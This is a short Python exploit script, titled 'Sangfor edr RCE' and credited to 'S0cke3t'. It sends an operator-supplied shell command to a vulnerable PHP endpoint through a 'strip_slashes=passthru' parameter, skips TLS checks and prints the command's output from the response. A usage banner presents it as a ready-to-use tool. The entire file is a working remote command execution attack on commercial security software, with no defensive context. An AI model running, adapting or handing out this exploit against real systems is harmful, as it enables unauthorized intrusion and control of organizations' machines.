#!/usr/bin/python
#auther by S0cke3t
#2020-8-19

import requests
import sys
import os
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
"Accept-Encoding": "gzip, deflate"
}


def Exploit(Target, Command):
    Command = Command.replace(" ","%20")
    resp = requests.get(Target + "/tool/log/c.php?strip_slashes=passthru&host=" + Command, verify=False)
    if(resp.status_code == 200):
        result = re.search('</p>(.*?)\n<pre>',resp.text)
        print(result.group(1))
        sys.exit()
    print("No exist vuln !")
    sys.exit()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("========== Sangfor edr RCE ==========\r\n")
        print("usage: "+str(sys.argv[0][sys.argv[0].rfind(os.sep) + 1:])+"  https://x.x.x.x:443  id\r\n")
        print("========== Auther By S0cke3t ==========")
        exit()
    Exploit(sys.argv[1],sys.argv[2])